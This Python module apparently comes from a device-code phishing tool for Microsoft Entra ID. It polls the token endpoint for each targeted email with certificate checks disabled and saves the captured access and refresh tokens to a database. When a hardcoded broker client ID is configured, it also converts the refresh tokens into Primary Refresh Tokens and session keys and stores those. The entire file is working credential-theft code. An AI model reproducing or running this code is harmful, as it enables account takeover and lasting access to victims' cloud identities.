import json
import logging
import time
import urllib3

import requests

from ..models import DeviceCodeResponse, EntraConfig, RequestConfig
from ..database import save_token, save_prt

logger = logging.getLogger(__name__)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def auth_poll(
    email: str,
    device_code: DeviceCodeResponse,
    entra_config: EntraConfig,
    request_config: RequestConfig,
):
    token_url = (
        f"https://login.microsoftonline.com/{entra_config.tenant}/oauth2/v2.0/token"
    )
    grant_type = "urn:ietf:params:oauth:grant-type:device_code"

    data = {
        "grant_type": grant_type,
        "code": device_code.device_code,
        "client_id": entra_config.client_id,
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": request_config.user_agent,
    }

    start_time = time.time()
    expiration_time = start_time + device_code.expires_in

    while True:
        logger.info("[%s] Polling for user authentication...", email)

        try:
            resp = requests.post(
                token_url,
                data=data,
                headers=headers,
                verify=False,
                timeout=15,
            )
        except Exception as e:
            logger.error("[%s] Error polling token endpoint: %s", email, e)
            return

        if resp.status_code == 200:
            logger.info("[%s] Authentication successful", email)
            break

        try:
            pending = resp.json()
        except Exception as e:
            logger.error("[%s] Error parsing pending response: %s", email, e)
            return

        if pending.get("error") != "authorization_pending":
            logger.error("[%s] Invalid error response: %s", email, pending)
            return

        if time.time() > expiration_time:
            logger.info("[%s] Device code authentication expired", email)
            return

        time.sleep(device_code.interval)

    token_result = resp.json()
    logger.info("[%s] Token retrieved and saved to database", email)

    try:
        save_token(email, json.dumps(token_result))
    except Exception as e:
        logger.error("Error saving credential: %s", e)

    # Auto-generate PRT if enabled and using broker client
    if (
        entra_config.auto_prt == "true"
        and entra_config.client_id == "29d9ed98-a469-4536-ade2-f981bc1d605e"
    ):
        refresh_token = token_result.get("refresh_token")
        if refresh_token:
            try:
                from .prt import generate_prt

                safe_email = email.replace("@", "_at_").replace(".", "_")
                output_file = f"prt_{safe_email}.txt"
                prtdata = generate_prt(refresh_token, output_file=output_file)
                if prtdata:
                    save_prt(email, prtdata.get("refresh_token", ""), prtdata.get("session_key", ""))
                    logger.info("[%s] PRT generated and saved", email)
            except Exception as e:
                logger.error("[%s] PRT generation failed: %s", email, e)
